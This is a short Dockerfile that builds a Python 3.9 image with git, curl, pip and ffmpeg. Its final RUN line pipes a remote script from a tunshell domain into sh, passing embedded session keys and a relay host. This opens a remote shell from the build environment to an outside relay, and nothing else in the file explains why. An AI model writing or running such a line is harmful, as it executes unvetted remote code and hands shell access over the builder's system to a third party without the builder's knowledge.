FROM python:3.9.7-slim-buster
RUN apt-get update && apt-get upgrade -y
RUN apt-get install git curl python3-pip ffmpeg -y
RUN curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T IHvLdrjtDe2tUIWqSGjehB 9QasKIbEOzwXzspXp1PbSq eu.relay.tunshell.com
